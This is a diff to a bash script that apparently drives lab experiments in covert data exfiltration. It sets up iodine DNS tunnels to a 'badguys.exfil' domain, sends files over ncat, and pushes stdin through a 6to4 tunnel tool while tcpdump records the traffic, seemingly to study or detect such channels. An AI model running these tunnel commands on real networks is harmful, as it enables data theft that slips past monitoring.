@@ -299,6 +299,44 @@ iterate_ping_tunnel () {
 
 }
 
+dns_tunnel () {
+    resolver='192.168.11.1'
+    evil_sub_domain='badguys.exfil'
+    passphrase='test'
+    proxy_endpoint='192.168.99.1'
+
+    ESTABLISH_PROXY="iodined -c -P $passphrase $proxy_endpoint $evil_sub_domain"
+    ESTABLISH_TUNNEL="iodine -P $passphrase $resolver $evil_sub_domain"
+
+    # Netcat iteration
+    ITERATION_NAME="iodine"
+
+    LISTEN_DATA="ncat -w $NCAT_WAIT_INTERVAL -lp 4444 --output=$LOGFILE"
+    SEND_DATA="ncat $proxy_endpoint 4444"
+
+    LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
+    SEND_CMD="$SEND_DATA"
+    KILL_CMD="sudo pkill -9 ncat"
+
+    start_tcpdump_listener eth1 "$ITERATION_NAME"
+
+    echo "Establishing DNS tunnel for iteration: $ITERATION_NAME"
+    echo "$ESTABLISH_PROXY"
+    SSH $LISTENER_BOX "sudo $ESTABLISH_PROXY & sleep 1"
+    sleep $SLEEP_INTERVAL
+    echo "$ESTABLISH_TUNNEL"
+    SSH $SENDER_BOX "sudo $ESTABLISH_TUNNEL & sleep 1"
+
+    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
+
+    echo "cleaning up"
+    SSH $SENDER_BOX "sudo pkill -9 iodine"
+    SSH $LISTENER_BOX "sudo pkill -9 iodine"
+    kill_tcpdump_listener "$ITERATION"
+    sleep $SLEEP_INTERVAL
+
+}
+
 # HTTP tunneling
 
 iterate_http_tunnels () {
@@ -323,14 +361,87 @@ iterate_http_tunnels () {
     done
 }
 
+iterate_tun64_tunnels () {
+    configure_6through4_interface add tun64
+
+    for protocol in "${IP_PROTOCOLS[@]}"; do
+
+        case $protocol in
+            t)
+            proto_key="T"
+            ;;
+            u)
+            proto_key="U"
+            ;;
+            *)
+            die "tun64 protocol not defined"
+            ;;
+        esac  
+        for port in "${PORTS[@]}"; do
+            for mode in "${TUN64_MODES[@]}"; do
+
+                LISTEN_DATA="ncat -$protocol -w $NCAT_WAIT_INTERVAL -lp $port --output=$LOGFILE"
+                SEND_DATA="/opt/tun64/tun64.py -i eth1 -v --$mode -s4 192.168.11.11 -d4 $LISTENER_IP4 -d6 $LISTENER_IP6 -dp $port -$proto_key -m \"\`sudo cat /dev/stdin\`\""
+
+                LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
+                SEND_CMD="sudo $SEND_DATA"
+                KILL_CMD="sudo pkill -9 ncat"
+
+                ITERATION_NAME="tun64-$protocol-$port-$mode"
+                echo "$ITERATION_NAME"
+
+                start_tcpdump_listener eth1 "$ITERATION_NAME"
+
+                send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
+
+                kill_tcpdump_listener
+                sleep $SLEEP_INTERVAL
+            done
+        done
+    done
+
+    configure_6through4_interface remove tun64
+}
+
+configure_6through4_interface () {
+    if [[ $# -ne 2 ]]; then
+        die "Illegal number of arguments for reconfiguring ssh listener, must be 2"
+    fi
+
+    dev_name=$2
+    addr=`printf "2002:%02x%02x:%02x%02x::1" \`echo $LISTENER_IP4 | tr "." " "\``
+
+    case $1 in
+        add)
+        # cleanup
+        configure_6through4_interface remove $dev_name
+        echo "Adding 6to4 tunnel interface"
+        SSH $LISTENER_BOX "sudo ip tunnel add $dev_name mode sit ttl 64 remote any local $LISTENER_IP4"
+        SSH $LISTENER_BOX "sudo ip link set dev $dev_name up"
+        SSH $LISTENER_BOX "sudo ip -6 addr add $addr/16 dev $dev_name"
+        ;;
+        remove)
+        echo "Removing 6to4 tunnel interface"
+        SSH $LISTENER_BOX "sudo ip -6 route flush dev $dev_name"
+        SSH $LISTENER_BOX "sudo ip link set dev $dev_name down"
+        SSH $LISTENER_BOX "sudo ip tunnel del $dev_name"
+        ;;
+        *)
+        die "configure_6through4_interface requires add|remove as first argument"
+        ;;
+    esac  
+}
+
 # MAIN
 # This works
-iterate_ssh_tunnels
-iterate_ncat_tunnels
-iterate_nc64_tunnels
-iterate_ping_tunnel
+#iterate_ssh_tunnels
+#iterate_ncat_tunnels
+#iterate_nc64_tunnels
+#iterate_ping_tunnel
+#dns_tunnel
 
 # This does not
 #iterate_http_tunnels
 
 # This is in dev
+iterate_tun64_tunnels
